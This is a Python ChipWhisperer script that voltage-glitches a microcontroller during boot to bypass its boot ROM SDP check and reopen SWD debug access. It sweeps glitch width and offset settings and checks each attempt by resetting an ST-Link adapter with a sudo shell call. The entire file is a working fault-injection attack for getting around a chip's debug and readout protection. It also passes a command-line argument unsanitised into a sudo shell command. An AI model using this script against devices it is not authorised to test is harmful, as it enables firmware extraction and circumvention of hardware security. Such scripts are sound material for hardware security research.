import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
import serial
import time
import sys
import os

scope = None
# SWD device variable
dev = ""
usb_path = sys.argv[1]

'''
boot_mode_enable
Used to check if boot rom SDP check has been bypassed
1. Reset the STLink adapter using the usbreset program
2. Attempt to communicate with the DAP over SWD
'''
def boot_mode_enable():
    global dev
    import swd
    pc = 0
    try:    
        os.system(f"sudo /home/pi/glitch/replicant/python/usbreset {usb_path}")
        dev = swd.Swd()
        pc = dev.get_version().str
    except:
        del swd
        pass
    return pc

def reboot_flush():            
    global scope
    # Cut power to target device
    scope.io.target_pwr = False
    # Pull reset low
    scope.io.nrst = False
    # Set up CW for glitching
    scope.arm()
    # Put reset in high impedance mode (we are triggering off of it)
    scope.io.nrst = "high_z"
    # Power the target and wait for the glitch to trigger
    scope.io.target_pwr = True

scope = cw.scope()
scope.io.target_pwr = "high_z"

'''
The following lines were pulled from CW jupyter notebooks from the tutorials/documentation
'''
try:
    if SS_VER == "SS_VER_2_1":
        target_type = cw.targets.SimpleSerial2
    elif SS_VER == "SS_VER_2_0":
        raise OSError("SS_VER_2_0 is deprecated. Use SS_VER_2_1")
    else:
        target_type = cw.targets.SimpleSerial
except:
    SS_VER="SS_VER_1_1"
    target_type = cw.targets.SimpleSerial

try:
    target = cw.target(scope, target_type)
except:
    print("INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.")
    print("INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.")
    scope = cw.scope()
    target = cw.target(scope, target_type)

print("Found CW!")

# Set up scope specific parameters
scope.clock.clkgen_freq = 100E6
# Trigger on IO4 this is connected to our reset line
scope.trigger.triggers = 'tio4'
scope.adc.samples = 24400
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.adc.decimate = 10
scope.glitch.clk_src = "clkgen" # set glitch input clock
scope.glitch.output = "enable_only" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
scope.io.glitch_lp = True
scope.io.glitch_hp = True

g_step = 1
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)
gc.set_range("width", 40, 40)
gc.set_range("offset", -45, -45)
gc.set_range("ext_offset", 19000, 19800)
reboot_flush()
# How many times we attempt each configuration
sample_size = 30
# How many clock cycles we pull low for
scope.glitch.repeat=20
offsets = []
for glitch_setting in gc.glitch_values():
    scope.glitch.width = glitch_setting[0]
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.ext_offset = glitch_setting[2]
    successes = 0
    failures = 0
    for i in range(sample_size):
        # Reboot target, arm scope, wait for glitch
        reboot_flush()
        # Allow target time to initialize
        time.sleep(2)
        # Reset glitch lines as reccomended in docs
        scope.io.glitch_hp = False
        scope.io.glitch_hp = True
        scope.io.glitch_lp = False
        scope.io.glitch_lp = True
        # Check to see if glitch was successful
        x = boot_mode_enable()
        if x:
            print("Success! -- offset = {}, width = {}, ext_offset = {}".format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))
            successes += 1
            break
    if successes > 0:                
        print("successes = {}, failures = {}, offset = {}, width = {}, ext_offset = {}".format(successes, failures, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))
        break
print("Done glitching")
